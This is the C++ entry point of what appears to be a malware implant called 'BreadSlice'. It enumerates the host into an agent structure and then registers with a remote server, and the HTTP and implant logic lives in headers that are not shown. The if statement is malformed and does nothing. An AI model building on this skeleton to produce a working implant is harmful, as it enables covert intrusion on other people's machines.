// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "Http.h"
#include "enum.h"
#include "implant.h"

Agent g_ImplantData = { 0 };

int main()
{
    Enumerate(&g_ImplantData);
   
    
    if (!RegisterAgent());
     
}

